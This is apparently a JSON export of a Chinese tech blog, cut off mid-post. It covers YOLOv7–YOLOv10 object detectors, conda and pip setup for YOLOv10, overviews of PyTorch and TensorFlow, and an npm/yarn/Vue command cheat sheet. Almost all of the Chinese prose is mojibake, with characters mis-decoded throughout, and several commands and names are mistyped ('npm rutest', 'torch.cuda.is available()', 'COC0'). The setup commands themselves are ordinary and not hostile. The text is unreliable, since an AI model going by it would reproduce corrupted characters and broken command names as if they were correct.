æ˜¯ä¸€æ¬¾å…ˆè¿›çš„ç‰©ä½“æ£€æµ‹å™¨ï¼Œåœ¨é€Ÿåº¦å’Œå‡†ç¡®æ€§ä¹‹é—´å–å¾—äº†å‡ºè‰²çš„å¹³è¡¡ï¼Œæ˜¯å®æ—¶åº”ç”¨çš„çƒ­é—¨é€‰æ‹©ã€‚è¯¥æ¨¡å‹åœ¨æ¶æ„å’Œè®­ç»ƒæ–¹æ¡ˆä¸Šå¼•å…¥äº†å‡ é¡¹æ˜¾è‘—çš„æ”¹è¿›ï¼ŒåŒ…æ‹¬åŒå‘ä¸²è”(Bic)æ¨¡å—ã€é”šç‚¹è¾…åŠ©è®­ç»ƒ(AAT)ç­–ç•¥ä»¥åŠæ”¹è¿›çš„éª¨å¹²å’Œé¢ˆéƒ¨è®¾è®¡ï¼Œä»è€Œåœ¨ COCo æ•°æ®é›†ä¸Šå®ç°äº†æœ€å…ˆè¿›çš„ç²¾åº¦ã€‚ Bic AAT YOLOv7:å¯è®­ç»ƒçš„å…è´¹ä¹¦åŒ…YOLOv7 æ˜¯æœ€å…ˆè¿›çš„å®æ—¶ç‰©ä½“æ£€æµ‹å™¨ï¼Œåœ¨5FPS åˆ° 160 FPS çš„èŒƒå›´å†…ï¼Œå…¶é€Ÿåº¦å’Œå‡†ç¡®æ€§éƒ½è¶…è¿‡äº†æ‰€æœ‰å·²çŸ¥çš„ç‰©ä½“æ£€æµ‹å™¨ã€‚åœ¨GPU V100 ä¸Šï¼ŒYOLOv7 çš„å‡†ç¡®ç‡(56.8% AP)åœ¨ 30 FPS æˆ–æ›´é«˜çš„æ‰€æœ‰å·²çŸ¥å®æ—¶ç‰©ä½“æ£€æµ‹å™¨ä¸­æ˜¯æœ€é«˜çš„ã€‚æ­¤å¤–ï¼ŒYOLOv7 åœ¨é€Ÿåº¦å’Œå‡†ç¡®æ€§ä¸Šéƒ½ä¼˜äº YOLORã€YOLOXã€Scaled-YOLOv4ã€YOLOv5 ç­‰å…¶ä»–ç‰©ä½“æ£€æµ‹å™¨ã€‚è¯¥æ¨¡å‹æ˜¯åœ¨ MS COC0 æ•°æ®é›†ä¸Šä»å¤´å¼€å§‹è®­ç»ƒçš„ï¼Œæ²¡æœ‰ä½¿ç”¨ä»»ä½•å…¶ä»–æ•°æ®é›†æˆ–é¢„å…ˆè®­ç»ƒçš„æƒé‡ã€‚YoLov7 çš„æºä»£ç å¯åœ¨GitHub ä¸Šè·å–ã€‚ YOLOv8YOLOv8 æ˜¯YOL0 ç³»åˆ—å®æ—¶ç‰©ä½“æ£€æµ‹å™¨çš„æœ€æ–°è¿­ä»£äº§å“ï¼Œåœ¨ç²¾åº¦å’Œé€Ÿåº¦æ–¹é¢éƒ½å…·æœ‰å°–ç«¯æ€§èƒ½ã€‚åœ¨ä¹‹å‰YOL0 ç‰ˆæœ¬çš„åŸºç¡€ä¸Šï¼ŒYOLov8 å¼•å…¥äº†æ–°çš„åŠŸèƒ½å’Œä¼˜åŒ–ï¼Œä½¿å…¶æˆä¸ºå¹¿æ³›åº”ç”¨ä¸­å„ç§ç‰©ä½“æ£€æµ‹ä»»åŠ¡çš„ç†æƒ³é€‰æ‹©ã€‚ YOLov9:ç‰©ä½“æ£€æµ‹æŠ€æœ¯çš„é£è·ƒå‘å±•YOLov9 å¼•å…¥äº†å¯ç¼–ç¨‹æ¢¯åº¦ä¿¡æ¯IPGI) å’Œå¹¿ä¹‰é«˜æ•ˆå±‚èšåˆç½‘ç»œ(GELAN) ç­‰å¼€åˆ›æ€§æŠ€æœ¯ï¼Œæ ‡å¿—ç€å®æ—¶ç›®æ ‡æ£€æµ‹é¢†åŸŸçš„é‡å¤§è¿›æ­¥ã€‚è¯¥æ¨¡å‹åœ¨æ•ˆç‡ã€å‡†ç¡®æ€§å’Œé€‚åº”æ€§æ–¹é¢éƒ½æœ‰æ˜¾è‘—æé«˜ï¼Œåœ¨ MS COC0 æ•°æ®é›†ä¸Šæ ‘ç«‹äº†æ–°çš„æ ‡æ†ã€‚YOLOv9 é¡¹ç›®è™½ç„¶æ˜¯ç”±ä¸€ä¸ªç‹¬ç«‹çš„å¼€æºå›¢é˜Ÿå¼€å‘çš„ï¼Œä½†å®ƒå»ºç«‹åœ¨ä»¥ä¸‹æœºæ„æä¾›çš„å¼ºå¤§ä»£ç åº“åŸºç¡€ä¹‹ä¸Š ultralytics YoLov5æä¾›çš„å¼ºå¤§ä»£ç åº“ï¼Œå±•ç¤ºäº†äººå·¥æ™ºèƒ½ç ”ç©¶ç•Œçš„åä½œç²¾ç¥ã€‚ YOLOå¼ºåœ¨ç›®æ ‡æ£€æµ‹ YOLOv10:å®æ—¶ç«¯åˆ°ç«¯ç‰©ä½“æ£€æµ‹YOLOv10 æ˜¯æ¸…åå¤§å­¦ç ”ç©¶äººå‘˜åœ¨ Ultralvtics Python,æ¸…åå¤§å­¦çš„ç ”ç©¶äººå‘˜åœ¨ YOLOv10è½¯ä»¶åŒ…çš„åŸºç¡€ä¸Šï¼Œå¼•å…¥äº†ä¸€ç§æ–°çš„å®æ—¶ç›®æ ‡æ£€æµ‹æ–¹æ³•ï¼Œè§£å†³äº†YOL0 ä»¥å‰ç‰ˆæœ¬åœ¨åå¤„ç†å’Œæ¨¡å‹æ¶æ„æ–¹é¢çš„ä¸è¶³ã€‚é€šè¿‡æ¶ˆé™¤éæœ€å¤§æŠ‘åˆ¶(NMS)å’Œä¼˜åŒ–å„ç§æ¨¡å‹ç»„ä»¶ï¼ŒYOLOv10 åœ¨æ˜¾è‘—é™ä½è®¡ç®—å¼€é”€çš„åŒæ—¶å®ç°äº†æœ€å…ˆè¿›çš„æ€§èƒ½ã€‚å¤§é‡å®éªŒè¯æ˜ï¼ŒYOLOv10 åœ¨å¤šä¸ªæ¨¡å‹å°ºåº¦ä¸Šå®ç°äº†å“è¶Šçš„ç²¾åº¦-å»¶è¿Ÿæƒè¡¡ã€‚å®æ—¶ç‰©ä½“æ£€æµ‹æ—¨åœ¨ä»¥è¾ƒä½çš„å»¶è¿Ÿå‡†ç¡®é¢„æµ‹å›¾åƒä¸­çš„ç‰©ä½“ç±»åˆ«å’Œä½ç½®ã€‚YOL0 ç³»åˆ—åœ¨æ€§èƒ½å’Œæ•ˆç‡ä¹‹é—´å–å¾—äº†å¹³è¡¡ï¼Œå› æ­¤ä¸€ç›´å¤„äºè¿™é¡¹ç ”ç©¶çš„å‰æ²¿ã€‚ç„¶è€Œï¼Œå¯¹ NMSçš„ä¾èµ–å’Œæ¶æ„ä¸Šçš„ä½æ•ˆé˜»ç¢äº†æœ€ä½³æ€§èƒ½çš„å®ç°ã€‚YOLOv10 é€šè¿‡ä¸ºæ— NMS è®­ç»ƒå¼•å…¥ä¸€è‡´çš„åŒé‡åˆ†é…å’Œä»¥æ•ˆç‡-å‡†ç¡®æ€§ä¸ºå¯¼å‘çš„æ•´ä½“æ¨¡å‹è®¾è®¡ç­–ç•¥ï¼Œè§£å†³äº†è¿™äº›é—®é¢˜ã€‚ ä¸»è¦åŠŸèƒ½1.æ—  NMSè®­ç»ƒ åˆ©ç”¨ä¸€è‡´çš„åŒé‡åˆ†é…æ¥æ¶ˆé™¤å¯¹ NMS çš„éœ€æ±‚ï¼Œä»è€Œå‡å°‘æ¨ç†å»¶è¿Ÿã€‚2.æ•´ä½“æ¨¡å‹è®¾è®¡:ä»æ•ˆç‡å’Œå‡†ç¡®æ€§çš„è§’åº¦å…¨é¢ä¼˜åŒ–å„ç§ç»„ä»¶ï¼ŒåŒ…æ‹¬è½»é‡çº§åˆ†ç±»å¤´ã€ç©ºé—´é€šé“å»è€¦å‘ä¸‹é‡‡æ ·å’Œç­‰çº§å¼•å¯¼å—è®¾è®¡ã€‚3.å¢å¼ºçš„æ¨¡å‹åŠŸèƒ½:çº³å…¥å¤§æ ¸å·ç§¯å’Œéƒ¨åˆ†è‡ªæ³¨æ„æ¨¡å—ï¼Œåœ¨ä¸å¢åŠ å¤§é‡è®¡ç®—æˆæœ¬çš„æƒ…å†µä¸‹æé«˜æ€§èƒ½ã€‚ æ— NMSè®­ç»ƒ æœ€æ ¸å¿ƒç‰¹ç‚¹ YOLov10 æœ‰å¤šç§å‹å·ï¼Œå¯æ»¡è¶³ä¸åŒçš„åº”ç”¨éœ€æ±‚:YOLOv10-N:ç”¨äºèµ„æºæå…¶æœ‰é™ç¯å¢ƒçš„çº³ç±³ç‰ˆæœ¬ã€‚YOLOv10-S:å…¼é¡¾é€Ÿåº¦å’Œç²¾åº¦çš„å°å‹ç‰ˆæœ¬ã€‚YOLOv10-M:é€šç”¨ä¸­å‹ç‰ˆæœ¬ã€‚YOLOv10-B:å¹³è¡¡å‹ï¼Œå®½åº¦å¢åŠ ï¼Œç²¾åº¦æ›´é«˜ï¼ŒYOLOv10-L:å¤§å‹ç‰ˆæœ¬ï¼Œç²¾åº¦æ›´é«˜ï¼Œä½†è®¡ç®—èµ„æºå¢åŠ ã€‚YOLOv10-X:è¶…å¤§å‹ç‰ˆæœ¬å¯å®ç°æœ€é«˜ç²¾åº¦å’Œæ€§èƒ½ã€‚ é€šä¿—æ˜“æ‡‚çš„YOLOv10ç¯å¢ƒæ„å»ºè¿‡ç¨‹ä½¿ç”¨çš„å‰æã€‚NVIDIA GPU:æ¨èè‡³å°‘æ˜¯GTX 1060&#x2F;RTX2060çº§åˆ«æˆ–æ›´é«˜:ã€‚CUDA Toolkitç‰ˆæœ¬:å»ºè®®ä½¿ç”¨CUDA 10.1æˆ–æ›´æ–°ç‰ˆæœ¬ã€‚ã€‚cuDNNç‰ˆæœ¬:ä¸CUDAç‰ˆæœ¬å¯¹åº”çš„cuDNNç‰ˆæœ¬ï¼Œã€‚NVIDIAé©±åŠ¨ç¨‹åº:æ¨èä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„NVIDIAé©±åŠ¨ç¨‹åºï¼Œä»¥ç¡®ä¿æœ€ä½³æ€§èƒ½å’ŒåŠŸèƒ½æ”¯æŒã€‚ å¦‚æœä¸è¡Œå°±åªèƒ½CPUè®­ç»ƒ~ å®‰è£…condaç¯å¢ƒ1ã€æ˜¾å¡ä¿¡æ¯æŸ¥çœ‹nvidia-smi nvæ§åˆ¶ç‰ˆé¢ 2ã€ä¸‹è½½anaconda3https://repo.anaconda.com/archive/Anaconda3-2024.06-1-Windows-x86 64.exehttps://www.anaconda.com/ 3ã€é…ç½®ç¯å¢ƒå˜é‡E:\\Application\\anaconda3E:\\Applicationanaconda3\\ScriptsE:\\Application\\anaconda3\\Library\\bin ç³»ç»Ÿå˜é‡path éªŒè¯ç¯å¢ƒæ˜¯å¦OKï¼Œå‡ºç°baseä»£è¡¨OKï¼Œæ²¡æœ‰å‡ºç°å¸è½½åœ¨å®‰è£…ä¸€æ¬¡1conda env list éªŒè¯ç®€å•condaå‘½ä»¤åˆ›å»ºpythonç¯å¢ƒ 1conda create -n yolov10 python==3.9 2ã€æŸ¥çœ‹ç°æœ‰ç¯å¢ƒ1conda env list 3ã€æ¿€æ´»ç¯å¢ƒ conda init1conda activate yolo 4ã€æ¿€æ´»å¤±è´¥1conda init cmd.exe 5ã€åˆ é™¤ç¯å¢ƒconda env remove -n yolo10 é…ç½®YOLOv10ç¯å¢ƒæç¤º:åƒä¸‡åˆ«å¼€åŠ é€Ÿå™¨ï¼Œå¼ºè°ƒNéï¼Œå¼€å®ŒåŠ é€Ÿå™¨å¯èƒ½ç‰ˆæœ¬ä¸å…¼å®¹ï¼Œç¯å¢ƒæŠ˜è…¾æ­»äºº ä¸‹è½½YOLov10æºç https://github.com/THU-MIG/yolov10 åˆ›å»ºYOLOv10ç¯å¢ƒconda create -n yolov10 python&#x3D;&#x3D;3.9 æ¿€æ´»yolov10ç¯å¢ƒconda activate yolov10 æ‰¾åˆ°æºç ä¸‹çš„çš„requirement.txtæ–‡æ¡£æŠŠtorchå’Œtorchvisionä¸¤ä¸ªæ³¨é‡Šæ‰ æ‰‹åŠ¨å®‰è£…pytorchå’Œtourchvisionã€‚è¿›å…¥pythorchå®˜ç½‘æ‰¾åˆ°2.0.1çš„ç‰ˆæœ¬ï¼Œå¤åˆ¶é“¾æ¥åæ‰‹åŠ¨å®‰è£…pip install torch&#x3D;&#x3D;2.0.1 torchvision&#x3D;&#x3D;0.15.2 torchaudio&#x3D;&#x3D;2.0.2 â€“index-url https://download.pytorch.org/whl/cu118éªŒè¯æ˜¯å¦OK,æ˜¾ç¤ºç»“æœä¸ºTrueä»£è¡¨å°±OKimport torchtorch.cuda.is available()&#x3D;&#x3D;&#x3D; true å®‰è£…æˆåŠŸåï¼Œæ‰§è¡Œpythonpip install -r requirements.txt ç¼–è¯‘æºç pip install -e . ä¸‹è½½é¢„è®­ç»ƒæƒé‡æ¨¡å‹https://github.com/THU-MIG/yolov10 https://github.com/THU-MIG/yolov10/releases/tag/v1.1 .pt yolov10-main&gt;yolo predict model&#x3D;yolov10n.pt source&#x3D;cat.jpg æ ‡æ³¨å·¥å…·lablemechineselableImg PS PyTorchPyTorch æ˜¯ä¸€ç§å¼€æºæ·±åº¦å­¦ä¹ æ¡†æ¶ï¼Œä»¥å‡ºè‰²çš„çµæ´»æ€§å’Œæ˜“ç”¨æ€§è‘—ç§°ã€‚è¿™åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ˜¯å› ä¸ºä¸æœºå™¨å­¦ä¹ å¼€å‘è€…å’Œæ•°æ®ç§‘å­¦å®¶æ‰€é’ççš„çƒ­é—¨ Python é«˜çº§ç¼–ç¨‹è¯­è¨€å…¼å®¹ã€‚ ä»€ä¹ˆæ˜¯ PyTorch?PvTorch æ˜¯ä¸€ç§ç”¨äºæ„å»ºæ·±åº¦å­¦ä¹ æ¨¡å‹çš„åŠŸèƒ½å®Œå¤‡æ¡†æ¶ï¼Œæ˜¯ä¸€ç§é€šå¸¸ç”¨äºå›¾åƒè¯†åˆ«å’Œè¯­è¨€å¤„ç†ç­‰åº”ç”¨ç¨‹åºçš„æœºå™¨å­¦ä¹ ã€‚ä½¿ç”¨ Python ç¼–å†™ï¼Œå› æ­¤å¯¹äºå¤§å¤šæ•°æœºå™¨å­¦ä¹ å¼€å‘è€…è€Œè¨€ï¼Œå­¦ä¹ å’Œä½¿ç”¨èµ·æ¥ç›¸å¯¹ç®€å•ã€‚PyTorch çš„ç‹¬ç‰¹ä¹‹å¤„åœ¨äºï¼Œå®ƒå®Œå…¨æ”¯æŒ GPUï¼Œå¹¶ä¸”ä½¿ç”¨åå‘æ¨¡å¼è‡ªåŠ¨å¾®åˆ†æŠ€æœ¯ï¼Œå› æ­¤å¯ä»¥åŠ¨æ€ä¿®æ”¹è®¡ç®—å›¾å½¢ã€‚è¿™ä½¿å…¶æˆä¸ºå¿«é€Ÿå®éªŒå’ŒåŸå‹è®¾è®¡çš„å¸¸ç”¨é€‰æ‹©ã€‚ ä¸ºä½•é€‰æ‹© PyTorch?PyTorch æ˜¯ Facebook Al Research å’Œå…¶ä»–å‡ ä¸ªå®éªŒå®¤çš„å¼€å‘è€…çš„å·¥ä½œæˆæœã€‚è¯¥æ¡†æ¶å°† Torch ä¸­é«˜æ•ˆè€Œçµæ´»çš„ GPU åŠ è°åç«¯åº“ä¸ç›´è§‚çš„ Pvthon å‰ç«¯ç›¸ç»“åˆï¼Œåè€…ä¸“æ³¨äºå¿«é€ŸåŸå‹è®¾è®¡ã€å¯è¯»ä»£ç ï¼Œå¹¶æ”¯æŒå°½å¯èƒ½å¹¿æ³›çš„æ·±åº¦å­¦ä¹ æ¨¡å‹ã€‚Pytorch æ”¯æŒå¼€å‘è€…ä½¿ç”¨ç†Ÿæ‚‰çš„å‘½ä»¤å¼ç¼–ç¨‹æ–¹æ³•ï¼Œä½†ä»å¯ä»¥è¾“å‡ºåˆ°å›¾å½¢ã€‚å®ƒäº 2017 å¹´ä»¥å¼€æºå½¢å¼å‘å¸ƒï¼Œå…¶Python æ ¹æºä½¿å…¶æ·±å—æœºå™¨å­¦ä¹ å¼€å‘è€…çš„å–œçˆ±ã€‚å’ŒTensorFlowåŒºåˆ« æ˜¯ å¯ä»¥åŠ¨æ€ä¿®æ”¹è®¡ç®—å›¾å½¢ã€‚çµæ´»æ€§ï¼Œæ˜“ç”¨æ€§ï¼Œæ·±åº¦å­¦ä¹ æ¡†æ¶ã€‚ TensorFlowTensorFlow æ˜¯ä¸€æ¬¾å…ˆè¿›çš„å¼€æºåº“ï¼Œæ—¨åœ¨å¼€å‘å’Œéƒ¨ç½²å…ˆè¿›çš„æœºå™¨å­¦ä¹ åº”ç”¨ç¨‹åºã€‚ ä»€ä¹ˆæ˜¯ TensorflowTensorFlow æ˜¯æ•°æ®ç§‘å­¦å®¶ã€è½¯ä»¶å¼€å‘è€…å’Œæ•™è‚²å·¥ä½œè€…ä¸»è¦ä½¿ç”¨çš„å¼€æºå¹³å°ï¼Œç”¨äºä½¿ç”¨æ•°æ®æµå›¾å½¢è¿›è¡Œæœºå™¨å­¦ä¹ ã€‚å›¾åƒä¸­çš„èŠ‚ç‚¹ä»£è¡¨æ•°å­¦è¿ç®—ï¼Œè€Œå›¾åƒè¾¹ç¼˜åˆ™ä»£è¡¨èŠ‚ç‚¹é—´æµåŠ¨çš„å¤šç»´æ•°æ®é˜µåˆ—(å¼ é‡)ã€‚è¿™ç§çµæ´»çš„æ¶æ„å…è®¸å°†æœºå™¨å­¦ä¹ ç®—æ³•æè¿°ä¸ºç›¸å…³è¿ç®—çš„å›¾å½¢ã€‚å¯ä»¥åœ¨ä¾¿æºå¼è®¾å¤‡ã€å°å¼ç”µè„‘å’Œé«˜ç«¯æœåŠ¡å™¨ç­‰ä¼—å¤šä¸åŒå¹³å°çš„ GPUã€CPU å’ŒTPU ä¸Šè®­ç»ƒå’Œæ‰§è¡Œè¿™äº›ä»£ç ï¼Œè€Œæ— éœ€é‡å†™ä»£ç ã€‚è¿™æ„å‘³ç€å„ç§èƒŒæ™¯çš„ç¼–ç¨‹äººå‘˜å‡å¯ä»¥ä½¿ç”¨ç›¸åŒçš„å·¥å…·é›†è¿›è¡Œåä½œä»è€Œæ˜¾è‘—æé«˜æ•ˆç‡ï¼Œè¯¥ç³»ç»Ÿæœ€åˆç”± Google Brain å›¢é˜Ÿå¼€å‘ï¼Œç”¨äºç ”ç©¶æœºå™¨å­¦ä¹ å’Œæ·±åº¦ç¥ç»ç½‘ç»œ(DNN)ï¼Œå…¶é€šç”¨æ€§åŒæ ·é€‚ç”¨äºå…¶ä»–å„ç§é¢†åŸŸã€‚TensorFlowçš„å·¥ä½œåŸç†TensorFlow å·¥ä½œæµç¨‹ç”±ä¸‰ä¸ªä¸åŒçš„éƒ¨åˆ†å®šä¹‰ï¼Œå³æ•°æ®é¢„å¤„ç†ã€æ„å»ºæ¨¡å‹å’Œè®­ç»ƒæ¨¡å‹ï¼Œä»è€Œè¿›è¡Œé¢„æµ‹ã€‚è¯¥æ¡†æ¶å°†æ•°æ®è¾“å…¥ç§°ä¸ºå¼ é‡çš„å¤šç»´æ•°ç»„ï¼Œå¹¶ä»¥ä¸¤ç§ä¸åŒçš„æ–¹å¼æ‰§è¡Œã€‚ä¸»è¦æ–¹æ³•æ˜¯æ„å»ºä¸€ä¸ªè®¡ç®—å›¾å½¢æ¥å®šä¹‰ç”¨äºè®­ç»ƒæ¨¡å‹çš„æ•°æ®æµã€‚ç¬¬äºŒç§å¸¸ç”¨çš„æ›´ç›´è§‚çš„æ–¹æ³•æ˜¯ä½¿ç”¨ Eager Executionï¼Œè¯¥æ–¹æ³•éµå¾ªå‘½ä»¤ç¼–ç¨‹åŸåˆ™å¹¶ç«‹å³è¯„ä¼°æ“ä½œã€‚ä½¿ç”¨ TensorFlow æ¶æ„ï¼Œé€šå¸¸åœ¨å°å¼ç”µ,è„‘æˆ–æ•°æ®ä¸­å¿ƒå®Œæˆè®­ç»ƒã€‚è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œå‡é€šè¿‡åœ¨ GPU ä¸Šæ”¾ç½®å¼ é‡æ¥åŠ å¿«å¤„ç†é€Ÿåº¦ã€‚ç„¶åï¼Œç»è¿‡è®­ç»ƒçš„æ¨¡å‹å¯ä»¥åœ¨ä¸€ç³»åˆ—å¹³å°ä¸Šè¿è¡Œï¼Œä»å°å¼ç”µè„‘åˆ°ç§»åŠ¨è®¾å¤‡ï¼Œç„¶åä¸€ç›´åˆ°äº‘ç«¯ã€‚TensorFlow è¿˜åŒ…å«å¾ˆå¤šæ”¯æŒåŠŸèƒ½ã€‚ä¾‹å¦‚ï¼ŒTensorBoard å…è®¸ç”¨æˆ·ä»¥ç›´è§‚æ–¹å¼ç›‘æ§è®­ç»ƒè¿‡ç¨‹ã€åº•å±‚è®¡ç®—å›¾å½¢å’ŒæŒ‡æ ‡ä»¥ä¾¿è°ƒè¯•è¿è¡Œä»¥åŠè¯„ä¼°æ¨¡å‹æ€§èƒ½ã€‚TensorBoard æ˜¯ Tensorflow å’Œ Keras çš„ç»Ÿä¸€å¯è§†åŒ–æ¡†æ¶,Keras æ˜¯åœ¨ TensorFlow ä¸Šè¿è¡Œçš„é«˜çº§ APIã€‚Keras é€šè¿‡æä¾›ç”¨äºæ„å»ºå¸¸è§ç”¨ä¾‹æ¨¡å‹çš„ç®€åŒ– APIï¼Œè¿›ä¸€æ­¥æ·±åŒ–TensorFlow çš„æŠ½è±¡æ¦‚å¿µã€‚API èƒŒåçš„é©±åŠ¨ç†å¿µæ˜¯èƒ½å¤Ÿåœ¨æ›´çŸ­çš„æ—¶é—´å†…å°†æƒ³æ³•è½å®ä¸ºç»“æœã€‚ TensorFlow çš„ä¼˜åŠ¿TensorFlow å¯ç”¨äºå¼€å‘è‡ªç„¶è¯­è¨€å¤„ç†ã€å›¾åƒè¯†åˆ«ã€æ‰‹å†™è¯†åˆ«ä»¥åŠåŸºäºè®¡ç®—çš„ä¸åŒæ¨¡æ‹Ÿ(ä¾‹å¦‚åå¾®åˆ†æ–¹ç¨‹)ç­‰å„ç§ä»»åŠ¡æ¨¡å‹ã€‚Tensorflow çš„ä¸»è¦ä¼˜åŠ¿åœ¨äºå…¶èƒ½å¤Ÿè·¨å¤šä¸ªåŠ é€Ÿå¹³å°æ‰§è¡Œä½çº§è¿ç®—ã€è‡ªåŠ¨è®¡ç®—æ¢¯åº¦ã€ç”Ÿäº§çº§å¯æ‰©å±•æ€§å’Œå¯äº’æ“ä½œçš„å›¾å½¢å¯¼å‡ºã€‚é€šè¿‡ä¸º Keras æä¾›é«˜çº§ AP!å’Œ Eager Executionï¼Œæ›¿ä»£ Tensorflow ä¸Šçš„æ•°æ®æµèŒƒå¼ï¼Œå§‹ç»ˆå¯ä»¥è½»æ¾ä¾¿æ·åœ°ç¼–å†™ä»£ç ã€‚ä½œä¸º Tensorflow çš„åŸå§‹å¼€å‘è€…ï¼ŒGoogle ä»ç„¶å¤§åŠ›æ”¯æŒè¯¥åº“ï¼Œå¹¶åŠ å¿«å…¶å‘å±•é€Ÿåº¦ã€‚ä¾‹å¦‚ï¼ŒGoogle åˆ›å»ºäº†ä¸€ä¸ªåœ¨çº¿ä¸­å¿ƒï¼Œç”¨äºå…±äº«ç”¨æˆ·åˆ›å»ºçš„è®¸å¤šä¸åŒæ¨¡å‹ã€‚ TensorFlowå’ŒNVIDIAå›¾å½¢å¤„ç†å™¨æˆ– GPU é…å¤‡ç”±æ•°åƒä¸ªå°å‹é«˜æ•ˆæ ¸å¿ƒç»„æˆçš„å¤§è§„æ¨¡å¹¶è¡Œæ¶æ„ï¼Œå¯ä»¥åŒæ—¶å¯åŠ¨æ•°åƒä¸ªå¹¶è¡Œçº¿ç¨‹ï¼Œèƒ½å¤Ÿå¼ºåŠ›æ”¯æŒè®¡ç®—å¯†é›†å‹ä»»åŠ¡ã€‚CPU MULTIPLE CORES GPU THOUSANDS OF CORESåå¹´å‰ï¼Œç ”ç©¶äººå‘˜å‘ç° GPU éå¸¸æ“…é•¿çŸ©é˜µè¿ç®—å’Œä»£æ•°è®¡ç®—ï¼Œè€Œæ·±åº¦å­¦ä¹ å°±ååˆ†ä¾èµ–äºè¿™ä¸¤ç§è¿ç®—ã€‚TensorFlow åœ¨æ–°æ¬¾ NVIDIA Pascal GPU ä¸Šçš„è¿è¡Œé€Ÿåº¦å¯æå‡é«˜è¾¾ 50%ï¼Œå¹¶ä¸”èƒ½å¤Ÿé¡ºåˆ©è·¨ GPU è¿›è¡Œæ‰©å±•ã€‚ å¦‚ä»Šï¼Œæ‚¨è®­ç»ƒæ¨¡å‹çš„æ—¶é—´å¯ä»¥ä»å‡ å¤©ç¼©çŸ­åˆ°å‡ å°æ—¶ã€‚TensorFlow ä½¿ç”¨ä¼˜åŒ–çš„ C++ å’Œ NVIDIAâ€™CUDAÂ·å·¥å…·åŒ…ç¼–å†™ï¼Œä½¿æ¨¡å‹èƒ½å¤Ÿåœ¨è®­ç»ƒå’Œæ¨ç†æ—¶åœ¨ GPU ä¸Šè¿è¡Œï¼Œä»è€Œå¤§å¹…æé€Ÿã€‚TensorFlow GPU æ”¯æŒéœ€è¦å¤šä¸ªé©±åŠ¨å’Œåº“ã€‚ä¸ºç®€åŒ–å®‰è£…å¹¶é¿å…åº“å†²çªï¼Œå»ºè®®åˆ©ç”¨ GPU æ”¯æŒçš„ TensorFlow Docker é•œåƒã€‚æ­¤è®¾ç½®ä»…éœ€è¦ NVIDIA GPU é©±åŠ¨å¹¶ä¸”å®‰è£… NVIDIA Dockerã€‚ç”¨æˆ·å¯ä»¥ä»é¢„é…ç½®äº†é¢„è®­ç»ƒæ¨¡å‹å’Œ Tensorflow åº“æ”¯æŒçš„ NGC(NVIDIA GPU Cloud)ä¸­æå–å®¹å™¨ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"yolo","slug":"yolo","permalink":"https://banjinmei.github.io/tags/yolo/"}],"author":"mu"},{"title":"VUE npm yarn","slug":"VUE-npm-yarn","date":"2024-07-27T15:53:03.000Z","updated":"2024-07-27T15:55:36.000Z","comments":true,"path":"2024/07/27/VUE-npm-yarn/","permalink":"https://banjinmei.github.io/2024/07/27/VUE-npm-yarn/","excerpt":"","text":"vite cretae vue npm yarn1npm init vite PNvue3ts 123cd PNnpm install npm run dev or 123npm install -g yarnyarn yarn dev 123456789101112131415161718192021NPMnpm init åˆå§‹åŒ–æŸä¸ªé¡¹ç›®npm install/link é»˜è®¤çš„å®‰è£…ä¾èµ–æ“ä½œnpm install taco --save å®‰è£…æŸä¸ªä¾èµ–ï¼Œå¹¶ä¸”é»˜è®¤ä¿å­˜åˆ°package.npm uninstall taco --save å®‰è£…æŸä¸ªå¼€å‘æ—¶ä¾èµ–é¡¹ç›®npm install taco --save-dev æ›´æ–°æŸä¸ªä¾èµ–é¡¹ç›®npm update taco --saveå®‰è£…æŸä¸ªå…¨å±€ä¾èµ–é¡¹ç›®npm install taco --global å®‰è£…æŸä¸ªå…¨å±€ä¾èµ–é¡¹ç›®npm publish/login/1ogout å‘å¸ƒ/ç™»å½•/ç™»å‡ºï¼Œä¸€ç³»åˆ—NPM Registryæ“ä½œnpm rutest è¿è¡ŒæŸä¸ªå‘½ä»¤YARNyarn init åˆå§‹åŒ–æŸä¸ªé¡¹ç›®yarn install/link é»˜è®¤çš„å®‰è£…ä¾èµ–æ“ä½œyarn add taco å®‰è£…æŸä¸ªä¾èµ–ï¼Œå¹¶ä¸”é»˜è®¤ä¿å­˜åˆ°package.yarn remove taco å®‰è£…æŸä¸ªå¼€å‘æ—¶ä¾èµ–é¡¹ç›®yarn add taco --dev å®‰è£…æŸä¸ªå¼€å‘æ—¶ä¾èµ–é¡¹ç›®yarn upgrade taco æ›´æ–°æŸä¸ªä¾èµ–é¡¹ç›®yarn global add taco å®‰è£…æŸä¸ªå…¨å±€ä¾èµ–é¡¹ç›®yarn publish/login/1ogout å‘å¸ƒ/ç™»å½•/ç™»å‡ºï¼Œä¸€ç³»åˆ—NPM Registryæ“ä½œyarn rutest è¿è¡ŒæŸä¸ªå‘½ä»¤ -Sç­‰åŒäºâ€“saveï¼Œå°†ä¾èµ–å®‰è£…è‡³è¿è¡Œä¾èµ–-Dç­‰åŒäºâ€“save-devï¼Œå°†ä¾èµ–å®‰è£…è‡³å¼€å‘ä¾èµ–-gå…¨å±€ 123yarn add vue-router -Syarn add element-plus -S æŒ‰éœ€åŠ è½½ 1yarn add unplugin-vue-components -D package.json æŸ¥çœ‹ ä¾èµ– main.ts -&gt; app.vue elementplup dochttp://element-plus.org/zh-CN/component/overview.htmlhttps://element-plus.org/zh-CN/guide/quickstart.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"npm","slug":"npm","permalink":"https://banjinmei.github.io/tags/npm/"},{"name":"VUE","slug":"VUE","permalink":"https://banjinmei.github.io/tags/VUE/"},{"name":"yarn","slug":"yarn","permalink":"https://banjinmei.github.io/tags/yarn/"}],"author":"mu"},{"title":".NET MSTest Xunit","slug":"NET-MSTest-Xunit","date":"2024-07-26T15:37:05.000Z","updated":"2024-07-26T15:41:28.000Z","comments":true,"path":"2024/07/26/NET-MSTest-Xunit/","permalink":"https://banjinmei.github.io/2024/07/26/NET-MSTest-Xunit/","excerpt":"","text":"node apiä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ Node.js å’Œ Express.js ç¼–å†™çš„ç®€å• RESTful API ç¤ºä¾‹ã€‚ 1. 